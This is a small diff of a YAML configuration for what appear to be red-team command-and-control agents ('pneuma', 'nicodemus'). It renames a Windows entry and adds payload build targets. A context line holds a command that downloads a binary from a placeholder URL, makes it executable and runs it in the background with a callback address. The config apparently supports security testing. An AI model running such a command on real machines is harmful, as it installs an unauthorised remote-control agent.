@@ -39,7 +39,7 @@ pneuma:
     pneuma-linux:
       install: |
         curl PAYLOAD.URL > /tmp/pneuma && chmod +x /tmp/pneuma && nohup /tmp/pneuma -name $(echo $HOSTNAME) -address #{callback} -range "Cloud" &
-    pneuma-windows:
+    pneuma-windows.exe:
       install: |
         mkdir "c:\aws\download"
         Set-Location "c:\aws\download"
@@ -80,6 +80,10 @@ nicodemus:
       - http
       - tcp
       - udp
+  payloads:
+    nicodemus-darwin: {}
+    nicodemus-linux: {}
+    nicodemus-windows.exe: {}
 
 ctf:
   metadata:
